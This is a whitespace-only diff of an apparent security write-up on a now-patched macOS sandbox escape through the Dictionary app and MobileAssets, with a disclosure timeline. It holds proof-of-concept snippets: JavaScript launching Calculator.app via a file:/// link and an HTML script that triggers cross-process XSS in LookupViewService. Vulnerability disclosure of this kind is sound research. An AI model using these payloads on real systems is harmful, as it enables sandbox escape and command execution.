@@ -36,13 +36,13 @@ The usage of this private API (more specifically, `ASAssetQuery` and `ASAsset`) 
 This snippet gives you information for all installed dictionaries:
 
 ```objectivec
-const static NSString *kVictim = @"com.apple.dictionary.AppleDictionary";  
-ASAssetQuery *query = [[ASAssetQuery alloc] initWithAssetType:kType];  
-query.predicate = [NSPredicate predicateWithFormat:  
- @"DictionaryIdentifier == [c]%@ "  
- /*@"and __DownloadState == [c]'Downloaded' "*/, kVictim];  
-NSError *err = NULL;  
-[query runQueryAndReturnError:&err];  
+const static NSString *kVictim = @"com.apple.dictionary.AppleDictionary";
+ASAssetQuery *query = [[ASAssetQuery alloc] initWithAssetType:kType];
+query.predicate = [NSPredicate predicateWithFormat:
+ @"DictionaryIdentifier == [c]%@ "
+ /*@"and __DownloadState == [c]'Downloaded' "*/, kVictim];
+NSError *err = NULL;
+[query runQueryAndReturnError:&err];
 NSArray *results = [query results];
 ```
 
@@ -157,8 +157,8 @@ A dictionary bundle for macOS & iOS consists of embed HTML and indexes. Javascri
 In the WebView of Dictionary app (before 10.15), these few lines of javascript bring you a neat calculator.
 
 ```js
-a = document.createElement('a');  
-a.href = 'file:///Applications/Calculator.app';  
+a = document.createElement('a');
+a.href = 'file:///Applications/Calculator.app';
 a.click()
 ```
 
@@ -201,27 +201,27 @@ This floating window is triggable from WebProcess IPC by invoking `WebKit::WebPa
 To look up a certain word in Dictionary, we can create a text selection before exploiting WebKit.
 
 ```html
-<span id="key" style="font-size: 1px">ExploitStage1</span>  
-<script type="text/javascript">  
-(function() {  
-  const span = document.getElementById('key');  
-  const selection = window.getSelection();  
-  const range = document.createRange();  
-  range.selectNodeContents(span);  
-  selection.removeAllRanges();  
-  selection.addRange(range);  
-})()  
+<span id="key" style="font-size: 1px">ExploitStage1</span>
+<script type="text/javascript">
+(function() {
+  const span = document.getElementById('key');
+  const selection = window.getSelection();
+  const range = document.createRange();
+  range.selectNodeContents(span);
+  selection.removeAllRanges();
+  selection.addRange(range);
+})()
 </script>
 ```
 
 Then the defination of `ExploitStage1` will automatically pop out in this floating layer and triggers our first inter-process XSS. This window is not Dictionary app yet, it belongs to `LookupViewService` process. It's WebView has no custom delegate handler, so the default behavior inWebKitLegacy is triggered. That is, a simplelocaiton.href navigation can make a universal link jump and open another app without user confirmation.
 
 ```
-* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.3  
-  * frame #0: 0x00007fff4445dda3 AppKit` -[NSWorkspace openURL:]  
+* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.3
+  * frame #0: 0x00007fff4445dda3 AppKit` -[NSWorkspace openURL:]
     frame #1: 0x00007fff54a3c7e1 WebKitLegacy` -[WebDefaultPolicyDelegate webView:decidePolicyForNavigationAction:request:frame:decisionListener:] + 241
 ```
- 
+
 Use `dict://ExploitStage2` to finally open Dictionary app and load the second stage XSS.
 
 ## Full Sandbox Escape
@@ -236,4 +236,3 @@ Since the MobileAssets framework does not set com.apple.quarantine attribute, we
 * 2019–09: sadly found the final step, command execution via file:/// URL is patched
 * 2019–09–27: reported to Apple
 * 2020–08–04: Apple addressed a beta release for the complete patch
-  
